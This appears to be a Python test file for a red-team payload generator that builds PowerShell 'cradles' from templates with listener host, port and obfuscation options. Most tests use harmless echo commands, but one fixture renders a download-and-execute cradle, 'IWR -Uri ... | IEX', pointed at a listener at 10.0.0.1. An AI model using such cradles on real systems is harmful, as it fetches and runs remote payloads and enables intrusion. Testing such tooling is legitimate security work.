#!/usr/bin/env python3
"""
Test that ps-features supports combining both command and code fields
"""
import sys
import tempfile
import os
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.web.app import generate_cradle, ps_features

def test_command_and_code_combined():
    """Test a cradle with both command and code fields"""
    print("="*70)
    print("Testing Command + Code Combined")
    print("="*70)
    
    # Create a mock ps-features entry
    mock_cradle = {
        'name': 'Test-Command-Code',
        'type': 'cradle-exe',
        'command': 'echo "Command executed" > /tmp/test_ps_features_cmd.txt',
        'code': 'Write-Host "This is the cradle code: {{ output_file }}"'
    }
    
    # Add to ps_features temporarily
    ps_features.append(mock_cradle)
    
    try:
        # Test generation
        result_code, error = generate_cradle(
            cradle_name='Test-Command-Code',
            lhost='192.168.1.100',
            lport=8080,
            output_file='payload.exe',
            obf_method='',
            namespace='',
            class_name='',
            entry_point='',
            args='',
            output_path='/tmp'
        )
        
        print(f"\nGenerated cradle code:")
        print(result_code)
        print(f"\nError (if any): {error}")
        
        # Verify the command was executed
        if os.path.exists('/tmp/test_ps_features_cmd.txt'):
            print("\n✓ Command was executed successfully")
            with open('/tmp/test_ps_features_cmd.txt', 'r') as f:
                print(f"  Command output: {f.read().strip()}")
            os.remove('/tmp/test_ps_features_cmd.txt')
        else:
            print("\n✗ Command was not executed")
        
        # Verify the code field was used as output
        if 'This is the cradle code: payload.exe' in result_code:
            print("✓ Code field was used as output (not command stdout)")
        else:
            print("✗ Code field was not used correctly")
            
        # Verify variable substitution worked
        if '{{ output_file }}' not in result_code:
            print("✓ Variables were substituted in code field")
        else:
            print("✗ Variables were not substituted")
            
    finally:
        # Clean up
        ps_features.remove(mock_cradle)
    
    print("\n" + "="*70)

def test_code_only():
    """Test a cradle with code field only"""
    print("\nTesting Code Only (no command)")
    print("-"*70)
    
    mock_cradle = {
        'name': 'Test-Code-Only',
        'type': 'cradle-exe',
        'code': 'IWR -Uri "{{ url }}/{{ output_file }}" | IEX'
    }
    
    ps_features.append(mock_cradle)
    
    try:
        result_code, error = generate_cradle(
            cradle_name='Test-Code-Only',
            lhost='10.0.0.1',
            lport=80,
            output_file='script.ps1',
            obf_method='',
            namespace='',
            class_name='',
            entry_point='',
            args='',
            output_path='/tmp'
        )
        
        print(f"Generated: {result_code}")
        
        if 'IWR -Uri "http://10.0.0.1/script.ps1" | IEX' in result_code:
            print("✓ Code-only cradle works correctly")
        else:
            print("✗ Code-only cradle failed")
            
    finally:
        ps_features.remove(mock_cradle)

def test_command_only():
    """Test a cradle with command field only"""
    print("\nTesting Command Only (no code)")
    print("-"*70)
    
    mock_cradle = {
        'name': 'Test-Command-Only',
        'type': 'cradle-exe',
        'command': 'echo "Generated from command: {{ output_file }}"'
    }
    
    ps_features.append(mock_cradle)
    
    try:
        result_code, error = generate_cradle(
            cradle_name='Test-Command-Only',
            lhost='10.0.0.1',
            lport=80,
            output_file='output.exe',
            obf_method='',
            namespace='',
            class_name='',
            entry_point='',
            args='',
            output_path='/tmp'
        )
        
        print(f"Generated: {result_code}")
        
        if 'Generated from command: output.exe' in result_code:
            print("✓ Command-only cradle works correctly")
        else:
            print("✗ Command-only cradle failed")
            
    finally:
        ps_features.remove(mock_cradle)

if __name__ == '__main__':
    test_command_and_code_combined()
    test_code_only()
    test_command_only()
    
    print("\n" + "="*70)
    print("All tests completed!")
    print("="*70)
